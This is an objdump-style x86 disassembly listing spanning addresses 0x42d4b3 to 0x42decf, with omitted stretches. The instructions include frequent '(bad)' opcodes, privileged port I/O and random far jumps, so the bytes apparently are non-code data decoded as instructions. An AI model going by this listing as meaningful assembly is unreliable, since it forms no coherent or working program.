  42d4b3:	lds    ebx,FWORD PTR [edx+0x5c80e89e]
  42d4b9:	jnp    0x42d515
  42d4bb:	sub    dl,al
  42d4bd:	mov    edx,0x754e549
  42d4c2:	test   eax,0xbacf3b75
  42d4c7:	xor    bl,BYTE PTR [edi]
  42d4c9:	loopne 0x42d50c
  42d4cb:	sub    dl,BYTE PTR [esi+esi*1+0x12]
  42d4cf:	jecxz  0x42d48b
  42d4d1:	and    DWORD PTR [edx],esp
  42d4d3:	jmp    0x42d45c
  42d4d5:	int3   
  42d4d6:	jo     0x42d49c
  42d4d8:	pop    es
  42d4d9:	push   0x9638caec
  42d4de:	adc    ebx,DWORD PTR [esi]
  42d4e0:	inc    ecx
  42d4e1:	dec    ecx
  42d4e2:	mov    ds:0x1a7fde94,al
  42d4e7:	fistp  DWORD PTR [ecx+0x5d]
  42d4ea:	pop    ebp
  42d4eb:	lahf   
  42d4ec:	dec    ecx
  42d4ed:	scas   al,BYTE PTR es:[edi]
  42d4ee:	mov    ebx,0x4c8cce1c
  42d4f3:	sub    eax,0x36277233
  42d4f8:	fild   DWORD PTR [ebx]
  42d4fa:	call   0x7b4b094e
  42d4ff:	div    BYTE PTR [esi+edi*1-0x3fc0c898]
  42d506:	das    
  42d507:	shr    eax,1
  42d509:	cwde   
  42d50a:	out    dx,al
  42d50b:	jbe    0x42d52e
  42d50d:	scas   eax,DWORD PTR es:[edi]
  42d50e:	sbb    BYTE PTR [esi+0x0],dl
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xb6b969d5,eax
  42d583:	arpl   WORD PTR [eax],bx
  42d585:	in     eax,0x1
  42d587:	add    BYTE PTR [ecx+eax*1],al
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	adc    eax,0x910c4a74
  42d591:	pop    esi
  42d592:	mov    edx,0xed9ba33f
  42d597:	out    0x64,al
  42d599:	add    DWORD PTR [ebx+0x5b],edx
  42d59c:	add    esi,ecx
  42d59e:	fcmovnb st,st(2)
  42d5a0:	imul   BYTE PTR [ebx-0x4e140fbe]
  42d5a6:	push   es
  42d5a7:	push   0x8bd282e0
  42d5ac:	fistp  QWORD PTR [ebp+ebp*8+0x210098fb]
  42d5b3:	loope  0x42d5d5
  42d5b5:	repz div DWORD PTR [ebp-0x49e06608]
  42d5bc:	mov    ds,WORD PTR [edx+0x5d]
  42d5bf:	pop    edx
  42d5c0:	adc    edi,DWORD PTR [eax+0x52]
  42d5c3:	in     eax,dx
  42d5c4:	push   0x9801f44c
  42d5c9:	mov    al,0xfa
  42d5cb:	push   esp
  42d5cc:	and    DWORD PTR [ebx-0x2b],ecx
  42d5cf:	xor    ebp,DWORD PTR [esi-0x3c]
  42d5d2:	ss das 
  42d5d4:	jae    0x42d5c5
  42d5d6:	inc    edx
  42d5d7:	fstp   DWORD PTR [edi+ebp*4+0x29e09021]
  42d5de:	cmc    
  42d5df:	push   es
  42d5e0:	pop    esi
  42d5e1:	jns    0x42d64f
  42d5e3:	arpl   WORD PTR [edx+0x52cb356c],di
  42d5e9:	aam    0xb2
  42d5eb:	add    ch,BYTE PTR [ebp-0x23]
  42d5ee:	clc    
  42d5ef:	pop    edi
  42d5f0:	es dec ebp
  42d5f2:	xor    ch,BYTE PTR [edi]
  42d5f4:	add    ch,ch
  42d5f6:	stos   BYTE PTR es:[edi],al
  42d5f7:	jns    0x42d66f
  42d5f9:	push   ss
  42d5fa:	push   ds
  42d5fb:	addr16 pop ss
  42d5fd:	and    al,0x10
  42d5ff:	push   ds
  42d600:	add    dl,BYTE PTR [ecx-0x34511905]
  42d606:	pop    ebx
  42d607:	mul    BYTE PTR [ecx]
  42d609:	mov    ds:0x6b3756b2,eax
  42d60e:	add    eax,0xe5041c5
  42d613:	sbb    BYTE PTR [edx-0x1b273f5e],0x72
  42d61a:	adc    DWORD PTR [edi+0x68],eax
  42d61d:	sbb    ebx,DWORD PTR [edi-0x63edd53c]
  42d623:	mov    bl,0x74
  42d625:	int    0x2f
  42d627:	div    BYTE PTR [ebp-0x37]
  42d62a:	daa    
  42d62b:	stc    
  42d62c:	cmp    al,0xa8
  42d62e:	sar    DWORD PTR [edx+0x748d30a4],0x65
  42d635:	jle    0x42d5f5
  42d637:	jns    0x42d5ce
  42d639:	pop    esp
  42d63a:	fs nop
  42d63c:	scas   eax,DWORD PTR es:[edi]
  42d63d:	(bad)  
  42d63e:	jnp    0x42d672
  42d640:	mov    dh,0x43
  42d642:	loopne 0x42d5dc
  42d644:	fst    DWORD PTR [edx+edi*4]
  42d647:	add    al,0x4e
  42d649:	lahf   
  42d64a:	add    ebp,0xbbefbe4f
  42d650:	out    dx,al
  42d651:	pop    esi
  42d652:	ret    0x83ed
  42d655:	call   0x3af7723b
  42d65a:	daa    
  42d65b:	pop    ecx
  42d65c:	mov    al,ds:0xe1af207
  42d661:	cmp    eax,0xf379b61f
  42d666:	push   ebx
  42d667:	(bad)  
  42d668:	rol    BYTE PTR [ecx],1
  42d66a:	lods   al,BYTE PTR ds:[esi]
  42d66b:	xchg   ebp,eax
  42d66c:	xchg   ebp,eax
  42d66d:	mov    edx,0x3e028392
  42d672:	test   al,0xb8
  42d674:	inc    esp
  42d675:	cdq    
  42d676:	pop    esp
  42d677:	jns    0x42d692
  42d679:	(bad)  
  42d67a:	pop    ebp
  42d67b:	lahf   
  42d67c:	mov    ds:0x1e968b1e,eax
  42d681:	arpl   bp,ax
  42d683:	(bad)  [ebp-0x63]
  42d686:	(bad)  
  42d687:	pop    ebx
  42d688:	or     ch,ch
  42d68a:	add    eax,0x42546d2e
  42d68f:	fadd   QWORD PTR [eax]
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xd
  42d701:	enter  0xf3f4,0x1c
  42d705:	out    0x1,al
  42d707:	add    BYTE PTR [ecx+eax*1],al
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	(bad)  
  42d70d:	sbb    eax,0x18a4ed12
  42d712:	dec    ecx
  42d713:	mov    DWORD PTR [edx],esi
  42d715:	add    ch,al
  42d717:	push   ebx
  42d718:	mov    bh,0x70
  42d71a:	mov    DWORD PTR [eax-0x35],edx
  42d71d:	out    0xdb,al
  42d71f:	aam    0x21
  42d721:	add    esi,ecx
  42d723:	sub    al,0xd4
  42d725:	fdivr  QWORD PTR [edi]
  42d727:	mov    gs,WORD PTR [ebp+0x49]
  42d72a:	ret    
  42d72b:	test   eax,0x21faa4ff
  42d730:	dec    ebx
  42d731:	mov    eax,0xf6ed63b6
  42d736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d737:	inc    ebp
  42d738:	cmc    
  42d739:	adc    dh,BYTE PTR [eax+0x69]
  42d73c:	xchg   edi,eax
  42d73d:	mov    ch,0xb
  42d73f:	cwde   
  42d740:	es sahf 
  42d742:	cmp    ah,BYTE PTR ss:[esi]
  42d745:	pop    DWORD PTR [ecx+0x16]
  42d748:	sub    bl,dl
  42d74a:	gs dec edx
  42d74c:	imul   ecx,DWORD PTR [ebx+esi*4-0x407c0047],0xbef19e24
  42d757:	inc    edi
  42d758:	jne    0x42d760
  42d75a:	fs aam 0x90
  42d75d:	nop
  42d75e:	cli    
  42d75f:	mov    bl,0x9d
  42d761:	jle    0x42d71a
  42d763:	mov    bh,0xa4
  42d765:	xor    DWORD PTR [ebx+0x4bc09bc4],0x5b
  42d76c:	retf   
  42d76d:	stos   BYTE PTR es:[edi],al
  42d76e:	xor    bh,BYTE PTR [edx]
  42d770:	mov    esi,DWORD PTR [edi+0x2a]
  42d773:	retf   0xaff
  42d776:	push   0x1f6a56dd
  42d77b:	pop    ebx
  42d77c:	jl     0x42d702
  42d77e:	je     0x42d784
  42d780:	test   eax,0x5d25099a
  42d785:	push   edx
  42d786:	add    al,0x45
  42d788:	mov    bh,0x0
  42d78a:	outs   dx,DWORD PTR ds:[esi]
  42d78b:	xchg   edi,eax
  42d78c:	ja     0x42d7e0
  42d78e:	and    eax,0xc6fc88b9
  42d793:	retf   
  42d794:	sti    
  42d795:	es pop eax
  42d797:	mov    esp,0x5d7b864f
  42d79c:	mov    esi,0x1b331694
  42d7a1:	es adc al,0x61
  42d7a4:	pop    edi
  42d7a5:	mov    WORD PTR [eax],fs
  42d7a7:	sbb    al,0x43
  42d7a9:	test   eax,0x8cf955bd
  42d7ae:	cmp    esi,esi
  42d7b0:	xlat   BYTE PTR ds:[ebx]
  42d7b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7b2:	adc    BYTE PTR [ebp+0x340d1edb],bl
  42d7b8:	sar    BYTE PTR cs:[edi+0x756b1ba6],1
  42d7bf:	xchg   esi,eax
  42d7c0:	jl     0x42d7d0
  42d7c2:	bound  eax,QWORD PTR [edi]
  42d7c4:	sbb    ebx,edx
  42d7c6:	mov    eax,gs
  42d7c8:	add    ecx,ebx
  42d7ca:	aas    
  42d7cb:	scas   eax,DWORD PTR es:[edi]
  42d7cc:	cmp    dl,BYTE PTR [edi+0x5cfd8126]
  42d7d2:	cs call 0x5ec4:0x36bf79f1
  42d7da:	jnp    0x42d794
  42d7dc:	fs inc ecx
  42d7de:	leave  
  42d7df:	push   ebx
  42d7e0:	ds sbb al,0x53
  42d7e3:	add    esp,DWORD PTR [eax-0x4f]
  42d7e6:	je     0x42d858
  42d7e8:	jne    0x42d7d0
  42d7ea:	test   eax,0x5722c2e
  42d7ef:	and    ah,BYTE PTR [esi-0x55ebe553]
  42d7f5:	xor    al,0xa1
  42d7f7:	pop    esp
  42d7f8:	jb     0x42d834
  42d7fa:	dec    edi
  42d7fb:	ja     0x42d7c5
  42d7fd:	and    edx,ebp
  42d7ff:	mov    ds:0x332cb8ff,al
  42d804:	add    ecx,ecx
  42d806:	xlat   BYTE PTR ds:[ebx]
  42d807:	adc    al,0x1c
  42d809:	test   DWORD PTR [ebp+0x565eb131],esi
  42d80f:	push   esi
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xecc6961a
  42d881:	xor    ebp,DWORD PTR ds:0x1e7206d
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	inc    ebx
  42d88d:	out    dx,eax
  42d88e:	(bad)  [ebx+edx*8-0x7454240b]
  42d895:	push   edx
  42d896:	stos   WORD PTR es:[edi],ax
  42d898:	sar    DWORD PTR [esi+0x67],0x37
  42d89c:	or     al,0xf5
  42d89e:	bound  ecx,QWORD PTR [ecx]
  42d8a0:	xchg   ebx,eax
  42d8a1:	hlt    
  42d8a2:	adc    eax,0x46a617e
  42d8a7:	pusha  
  42d8a8:	pusha  
  42d8a9:	int    0xe
  42d8ab:	in     eax,0x9d
  42d8ad:	jg     0x42d877
  42d8af:	xchg   edi,eax
  42d8b0:	xor    BYTE PTR [ecx+0x404f02b6],0xeb
  42d8b7:	jl     0x42d848
  42d8b9:	sbb    DWORD PTR [edi+0x25ce4f57],ecx
  42d8bf:	dec    DWORD PTR [edi-0x3f43e98a]
  42d8c5:	xor    BYTE PTR [ecx],ch
  42d8c7:	mov    bl,0x57
  42d8c9:	pop    ecx
  42d8ca:	bound  edi,QWORD PTR [ecx+esi*1-0x78]
  42d8ce:	in     eax,0xf
  42d8d0:	xor    ecx,ebp
  42d8d2:	es xor eax,0x27dbbc
  42d8d8:	push   esp
  42d8d9:	cmp    esp,DWORD PTR [edi+0x5]
  42d8dc:	pop    eax
  42d8dd:	and    BYTE PTR [ebx+0x561d6360],0x10
  42d8e4:	das    
  42d8e5:	cmp    BYTE PTR [edi+0x10f89b21],0xe3
  42d8ec:	pop    ss
  42d8ed:	into   
  42d8ee:	out    dx,al
  42d8ef:	push   esp
  42d8f0:	pop    edi
  42d8f1:	(bad)  
  42d8f2:	ins    BYTE PTR es:[edi],dx
  42d8f3:	popf   
  42d8f4:	aaa    
  42d8f5:	jmp    0x62f4bb8f
  42d8fa:	fisttp QWORD PTR [edi+0x699ffb34]
  42d900:	pop    ds
  42d901:	sbb    edx,DWORD PTR [eax-0x1ee9ac6c]
  42d907:	outs   dx,BYTE PTR ds:[esi]
  42d908:	or     ch,bl
  42d90a:	aaa    
  42d90b:	fist   DWORD PTR [edx+0x35c9d95]
  42d911:	adc    DWORD PTR [edx*1-0xd392f9a],ecx
  42d918:	enter  0xd6fe,0xd7
  42d91c:	add    DWORD PTR [ebx+0x141f8f55],edi
  42d922:	mov    al,0x56
  42d924:	jo     0x42d907
  42d926:	xor    eax,0xf23d0dd9
  42d92b:	js     0x42d8ba
  42d92d:	xchg   esp,eax
  42d92e:	(bad)  
  42d930:	add    al,0x7
  42d932:	adc    eax,0xf6677877
  42d937:	in     eax,dx
  42d938:	pusha  
  42d939:	mov    al,ds:0xbff72870
  42d93e:	mov    ds:0x290785ee,al
  42d943:	mov    ah,0x1c
  42d945:	push   eax
  42d946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d947:	repz jmp 0xf4c:0x64457952
  42d94f:	sub    cl,al
  42d951:	sbb    DWORD PTR [edx-0x17bc9a29],edx
  42d957:	les    ecx,FWORD PTR [edx-0x8]
  42d95a:	mov    ecx,0x977cf1d
  42d95f:	jbe    0x42d93f
  42d961:	push   eax
  42d962:	dec    edi
  42d963:	je     0x42d8e5
  42d965:	sub    eax,0x5f465056
  42d96a:	sbb    eax,0xa32ccdcb
  42d96f:	je     0x42d9bf
  42d971:	in     eax,0xa1
  42d973:	push   ss
  42d974:	rcl    ch,cl
  42d976:	mov    ah,0xb4
  42d978:	popa   
  42d979:	(bad)  
  42d97a:	lods   al,BYTE PTR ds:[esi]
  42d97b:	xlat   BYTE PTR ds:[ebx]
  42d97c:	inc    eax
  42d97d:	sub    BYTE PTR [eax],bh
  42d97f:	aaa    
  42d980:	stos   BYTE PTR es:[edi],al
  42d981:	or     dl,BYTE PTR [edi+0x48]
  42d984:	pop    ecx
  42d985:	test   eax,0x3d9f6ed2
  42d98a:	pop    es
  42d98b:	add    eax,0x1780124f
	...
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	cmp    al,0x7d
  42da02:	scas   al,BYTE PTR es:[edi]
  42da03:	mov    dl,0x24
  42da05:	call   0x146da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	lock mov WORD PTR [ecx-0x6d1c8ec6],gs
  42da13:	mov    esp,0xd1ff997f
  42da18:	pop    edx
  42da19:	mov    dh,0x36
  42da1b:	xchg   esp,eax
  42da1c:	fcmovbe st,st(7)
  42da1e:	inc    esp
  42da1f:	dec    esi
  42da20:	push   esp
  42da21:	push   ds
  42da22:	and    BYTE PTR [edi],0x78
  42da25:	jmp    0x3b07:0xc3fbe6ce
  42da2c:	es inc esp
  42da2e:	(bad)  [esi+0x18]
  42da31:	out    dx,al
  42da32:	pop    esp
  42da33:	rcr    DWORD PTR [eax],cl
  42da35:	loop   0x42d9f3
  42da37:	stos   BYTE PTR es:[edi],al
  42da38:	repz addr16 jp 0x42daa9
  42da3c:	fsub   QWORD PTR [ecx+esi*8]
  42da3f:	lods   al,BYTE PTR ds:[esi]
  42da40:	or     eax,0xdc56eb18
  42da45:	stos   BYTE PTR es:[edi],al
  42da46:	dec    esp
  42da47:	std    
  42da48:	outs   dx,BYTE PTR ds:[esi]
  42da49:	shl    esi,1
  42da4b:	or     DWORD PTR [eax-0x4d],esi
  42da4e:	mov    cl,0x33
  42da50:	ror    DWORD PTR [ecx],1
  42da52:	sahf   
  42da53:	inc    edx
  42da54:	jo     0x42dac3
  42da56:	clc    
  42da57:	add    eax,0xabf9ec15
  42da5c:	stos   DWORD PTR es:[edi],eax
  42da5d:	iret   
  42da5e:	dec    esp
  42da5f:	retf   0xc198
  42da62:	stos   DWORD PTR es:[edi],eax
  42da63:	nop
  42da64:	(bad)  
  42da65:	mov    ds:0x779fe34d,eax
  42da6a:	sub    esp,DWORD PTR [edx]
  42da6c:	in     eax,dx
  42da6d:	outs   dx,BYTE PTR ds:[esi]
  42da6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da6f:	iret   
  42da70:	repz lock xchg ecx,eax
  42da73:	mov    WORD PTR [edx+0x7e],?
  42da76:	pop    ebp
  42da77:	adc    esp,ecx
  42da79:	neg    DWORD PTR [esi]
  42da7b:	std    
  42da7c:	pop    esi
  42da7d:	(bad)  
  42da7e:	fs into 
  42da80:	ror    ebx,0xa7
  42da83:	das    
  42da84:	add    edi,0x5b
  42da87:	and    BYTE PTR [edi],0x1c
  42da8a:	aad    0x19
  42da8c:	mov    dl,0x6b
  42da8e:	jne    0x42dabf
  42da90:	rol    BYTE PTR [edi+0x3c],0x6d
  42da94:	pushf  
  42da95:	and    DWORD PTR [edi-0x79d6be9b],0xffffffb0
  42da9c:	imul   edi,eax,0x7c
  42da9f:	sub    eax,0x8f53ad6a
  42daa4:	xchg   DWORD PTR [ecx],esi
  42daa6:	jae    0x42dae1
  42daa8:	into   
  42daa9:	inc    edi
  42daaa:	pop    ds
  42daab:	stos   BYTE PTR es:[edi],al
  42daac:	lods   al,BYTE PTR ds:[esi]
  42daad:	pop    edx
  42daae:	pop    ss
  42daaf:	push   ecx
  42dab0:	sti    
  42dab1:	jb     0x42dad7
  42dab3:	mov    DWORD PTR [ecx-0x7c846751],ebp
  42dab9:	shr    BYTE PTR [ebx+ebx*4-0x16954f74],1
  42dac0:	jno    0x42dab6
  42dac2:	call   0x36d4:0x476dccc0
  42dac9:	stos   DWORD PTR es:[edi],eax
  42daca:	inc    eax
  42dacb:	mov    esi,0xd55a5486
  42dad0:	lods   eax,DWORD PTR ds:[esi]
  42dad1:	outs   dx,DWORD PTR ds:[esi]
  42dad2:	nop
  42dad3:	cwde   
  42dad4:	cmp    BYTE PTR [eax+0x6a],dl
  42dad7:	sahf   
  42dad8:	adc    bl,BYTE PTR [ebx]
  42dada:	mov    es,WORD PTR [ebp+0x73192b02]
  42dae0:	jne    0x42db06
  42dae2:	inc    edi
  42dae3:	push   eax
  42dae4:	xchg   esi,eax
  42dae5:	mov    eax,0xd7908bcd
  42daea:	sahf   
  42daeb:	mov    BYTE PTR [ebx],dl
  42daed:	xchg   esi,eax
  42daee:	push   ecx
  42daef:	cmp    edi,DWORD PTR [ecx]
  42daf1:	loopne 0x42db30
  42daf3:	ins    DWORD PTR es:[edi],dx
  42daf4:	pop    ss
  42daf5:	shl    DWORD PTR [edx+0x458517bf],1
  42dafb:	stc    
  42dafc:	(bad)  
  42dafd:	in     al,0xf1
  42daff:	hlt    
  42db00:	popf   
  42db01:	push   esp
  42db02:	cmp    BYTE PTR [edx-0x340fe6fd],ch
  42db08:	cs push ebp
  42db0a:	cmp    al,0x66
  42db0c:	push   0x995429
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbff
  42db81:	loope  0x42db3f
  42db83:	push   ebx
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	in     eax,dx
  42db8d:	or     al,0x9e
  42db8f:	adc    ch,BYTE PTR [edi+0x13]
  42db92:	int3   
  42db93:	mov    al,ds:0xff8cf8cb
  42db98:	jmp    0x42dbdd
  42db9a:	mov    edi,0xe5fa7b7c
  42db9f:	repnz xor eax,0x272bdb17
  42dba5:	jo     0x42dbf4
  42dba7:	sti    
  42dba8:	sti    
  42dba9:	push   0xd
  42dbab:	pusha  
  42dbac:	iret   
  42dbad:	cmp    DWORD PTR [ebx],edx
  42dbaf:	sub    BYTE PTR [eax+0x1e],dl
  42dbb2:	enter  0x3fd7,0x1c
  42dbb6:	mov    ah,0x39
  42dbb8:	mov    ebx,0x6ac97560
  42dbbd:	imul   esp,DWORD PTR [esp+esi*2+0x3c],0xafbd7661
  42dbc5:	div    BYTE PTR [edi+0x71]
  42dbc8:	pop    esp
  42dbc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dbca:	mov    DWORD PTR [edi+0x61],eax
  42dbcd:	das    
  42dbce:	ja     0x42dc34
  42dbd0:	ret    0x8ec6
  42dbd3:	cli    
  42dbd4:	sar    BYTE PTR [ebp+0x24ca7efb],0xf7
  42dbdb:	arpl   WORD PTR [edx+ecx*4+0x8],si
  42dbdf:	in     eax,dx
  42dbe0:	sbb    eax,0x7b45fb85
  42dbe5:	add    DWORD PTR [edx-0xc0b1d51],eax
  42dbeb:	and    BYTE PTR [edx],cl
  42dbed:	add    ah,al
  42dbef:	daa    
  42dbf0:	add    DWORD PTR [esi-0x670ea469],edi
  42dbf6:	jecxz  0x42dc23
  42dbf8:	fnstenv [ebp+esi*2-0x690aaf5f]
  42dbff:	xor    esp,DWORD PTR ds:0xdcfcd3fd
  42dc05:	sbb    edi,DWORD PTR [ebx-0x5a]
  42dc08:	sub    bl,BYTE PTR [ebx+0x33]
  42dc0b:	push   ecx
  42dc0c:	loop   0x42dbfe
  42dc0e:	push   ds
  42dc0f:	stc    
  42dc10:	imul   ebp,DWORD PTR [ebx],0x10
  42dc13:	ja     0x42dc2a
  42dc15:	aam    0x43
  42dc17:	adc    DWORD PTR [esi+ecx*4],edi
  42dc1a:	dec    edi
  42dc1b:	sub    eax,0xe3ed9232
  42dc20:	inc    edx
  42dc21:	push   ecx
  42dc22:	pop    edx
  42dc23:	or     bl,dl
  42dc25:	mov    ecx,0xe76d0566
  42dc2a:	dec    ecx
  42dc2b:	pop    ss
  42dc2c:	stc    
  42dc2d:	adc    al,0xce
  42dc2f:	fnsave [eax]
  42dc31:	jge    0x42dbf1
  42dc33:	jmp    0x42dc13
  42dc35:	pop    edx
  42dc36:	pop    ecx
  42dc37:	nop
  42dc38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc39:	pushf  
  42dc3a:	add    BYTE PTR [ecx],dh
  42dc3c:	adc    ch,0xe
  42dc3f:	cld    
  42dc40:	ror    BYTE PTR [eax+0x1472cc16],cl
  42dc46:	mov    esi,0x1529c485
  42dc4b:	fadd   QWORD PTR [eax+0x581ac7fa]
  42dc51:	xchg   esp,eax
  42dc52:	sub    ebx,DWORD PTR [edx]
  42dc54:	sahf   
  42dc55:	ins    DWORD PTR es:[edi],dx
  42dc56:	sbb    BYTE PTR [edx-0x48acb59f],ch
  42dc5c:	push   eax
  42dc5d:	(bad)  
  42dc5e:	sti    
  42dc5f:	pop    ds
  42dc60:	out    0x80,al
  42dc62:	jmp    0x52:0x58ad0ab
  42dc69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc6a:	pavgw  mm3,QWORD PTR es:[ecx-0x9]
  42dc6f:	(bad)  
  42dc70:	lods   eax,DWORD PTR ds:[esi]
  42dc71:	std    
  42dc72:	das    
  42dc73:	pop    DWORD PTR [edx-0x35]
  42dc76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc77:	mov    ch,0xe4
  42dc79:	bound  ecx,QWORD PTR [esi]
  42dc7b:	sub    eax,0x1aa1e751
  42dc80:	pop    ds
  42dc81:	and    al,0xfc
  42dc83:	or     BYTE PTR [edi],bh
  42dc85:	loopne 0x42dc90
  42dc87:	xor    al,0xf8
  42dc89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc8a:	sub    eax,0x4b4af463
  42dc8f:	add    BYTE PTR [eax],0x0
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	sub    al,0x0
  42dd02:	loopne 0x42dd4d
  42dd04:	sub    al,0xea
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    al,0x1
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	gs jo  0x42dd1f
  42dd0f:	jo     0x42dd7f
  42dd11:	imul   ecx,ebp,0x231ba39f
  42dd17:	mov    ebx,0x143d040e
  42dd1c:	add    BYTE PTR [esi-0x3f95c0c1],bl
  42dd22:	push   0x4b892ec6
  42dd27:	inc    eax
  42dd28:	mov    ds:0x74d29dc6,eax
  42dd2d:	btc    ecx,edi
  42dd30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd31:	sbb    dl,BYTE PTR [edi]
  42dd33:	ja     0x42dccc
  42dd35:	addr16 mov ds:0x4f87,al
  42dd39:	inc    ecx
  42dd3a:	cmp    ebx,ebp
  42dd3c:	inc    ecx
  42dd3d:	pop    eax
  42dd3e:	push   edi
  42dd3f:	(bad)  
  42dd40:	gs adc cl,dl
  42dd43:	mov    BYTE PTR [ebx-0x74ee0f15],ch
  42dd49:	dec    ebx
  42dd4a:	adc    eax,ebp
  42dd4c:	push   esp
  42dd4d:	cmp    eax,0x3acec0c6
  42dd52:	call   0x753d:0x8b8960d1
  42dd59:	add    esi,DWORD PTR [esi]
  42dd5b:	lea    edx,[eax-0x7e]
  42dd5e:	xchg   dl,cl
  42dd60:	pop    edi
  42dd61:	(bad)  
  42dd62:	ficomp DWORD PTR [eax-0x7f]
  42dd65:	sub    al,0x9b
  42dd67:	jb     0x42dd79
  42dd69:	mov    eax,0xdf6c531a
  42dd6e:	jge    0x42dd49
  42dd70:	push   0x14
  42dd72:	mov    edi,ebp
  42dd74:	push   0x8255b812
  42dd79:	mov    edx,0xad0ed419
  42dd7e:	scas   al,BYTE PTR es:[edi]
  42dd7f:	aas    
  42dd80:	xor    eax,0x1c1d828a
  42dd85:	leave  
  42dd86:	test   DWORD PTR [ecx+0x19],eax
  42dd89:	lea    ebp,[esi+ebp*8+0x21449680]
  42dd90:	(bad)  ds:0xbc4dc2b9
  42dd96:	or     eax,0x280bfc93
  42dd9b:	xor    eax,0xf177e50d
  42dda1:	ret    
  42dda2:	jecxz  0x42ddc3
  42dda4:	lahf   
  42dda5:	fst    QWORD PTR [esi-0x611a8f7e]
  42ddab:	mov    eax,0xf0bc39e3
  42ddb0:	adc    edi,DWORD PTR [edi+0x41]
  42ddb3:	popf   
  42ddb4:	sub    DWORD PTR [edi+0x2c17713c],edx
  42ddba:	ja     0x42dd7c
  42ddbc:	mov    esi,0x4303072d
  42ddc1:	adc    eax,0x7f0b766d
  42ddc6:	jp     0x42dd6b
  42ddc8:	test   ecx,esi
  42ddca:	out    0xbd,al
  42ddcc:	inc    ebx
  42ddcd:	xchg   edx,eax
  42ddce:	sbb    bh,al
  42ddd0:	add    al,BYTE PTR [ecx+0x256a30ca]
  42ddd6:	aam    0xb0
  42ddd8:	sti    
  42ddd9:	fmul   st,st(0)
  42dddb:	or     ch,BYTE PTR [eax+ebp*2+0x79]
  42dddf:	aad    0x8c
  42dde1:	adc    edi,ebx
  42dde3:	dec    ebx
  42dde4:	mov    ds:0x5874b2db,eax
  42dde9:	arpl   WORD PTR [ebx+esi*4+0x60232faa],ax
  42ddf0:	adc    eax,0xf8d1ee3f
  42ddf5:	push   ebp
  42ddf6:	aas    
  42ddf7:	adc    bh,BYTE PTR [esi-0x7b]
  42ddfa:	mov    ch,0xd7
  42ddfc:	push   eax
  42ddfd:	out    0x97,eax
  42ddff:	jbe    0x42dda5
  42de01:	std    
  42de02:	mov    ah,0xd
  42de04:	add    al,0x1
  42de06:	into   
  42de07:	in     al,dx
  42de08:	repz push cs
  42de0a:	call   0xda:0x4c2385d8
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	cmovl  esp,DWORD PTR [ebp-0x29]
  42de84:	xor    bl,ch
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    al,0x1
  42de8a:	add    BYTE PTR [eax],al
  42de8c:	es test al,0x8e
  42de8f:	or     ecx,esp
  42de91:	dec    edi
  42de92:	xchg   ebp,eax
  42de93:	mov    edi,0xca767a99
  42de98:	call   0x14b658af
  42de9d:	and    eax,0xa2f0d178
  42dea2:	pop    ss
  42dea3:	sbb    DWORD PTR [ecx+0x3a],edx
  42dea6:	inc    ebx
  42dea7:	sub    eax,DWORD PTR [esp+eiz*8+0x1d]
  42deab:	fld    TBYTE PTR [esi*1+0x5cf01e38]
  42deb2:	xchg   ebx,eax
  42deb3:	imul   esp,eax,0x77485183
  42deb9:	or     BYTE PTR [eax-0x33],ch
  42debc:	(bad)  
  42debd:	xchg   ebx,eax
  42debe:	jl     0x42deaa
  42dec0:	hlt    
  42dec1:	(bad)  [ecx]
  42dec3:	ins    BYTE PTR es:[edi],dx
  42dec4:	push   cs
  42dec5:	fstp   TBYTE PTR [ecx+edi*2-0xb]
  42dec9:	sbb    bl,BYTE PTR ds:0xbafc5e25
  42decf:	cmp    esp,DWORD PTR [esi-0x6f823fde]
